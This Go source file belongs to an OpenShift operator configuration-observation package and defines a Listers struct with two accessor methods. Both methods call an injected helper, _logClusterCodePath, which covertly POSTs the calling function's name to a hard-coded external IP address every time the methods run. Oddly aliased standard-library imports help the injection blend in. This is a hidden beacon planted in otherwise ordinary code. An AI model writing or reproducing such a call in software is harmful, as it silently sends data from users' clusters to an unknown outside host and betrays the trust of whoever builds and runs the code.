package configobservation

import (
	godefaultbytes "bytes"
	"fmt"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
	corelistersv1 "k8s.io/client-go/listers/core/v1"
	"k8s.io/client-go/tools/cache"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type Listers struct {
	ConfigmapLister    corelistersv1.ConfigMapLister
	ResourceSync       resourcesynccontroller.ResourceSyncer
	PreRunCachesSynced []cache.InformerSynced
}

func (l Listers) ResourceSyncer() resourcesynccontroller.ResourceSyncer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l.ResourceSync
}
func (l Listers) PreRunHasSynced() []cache.InformerSynced {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l.PreRunCachesSynced
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
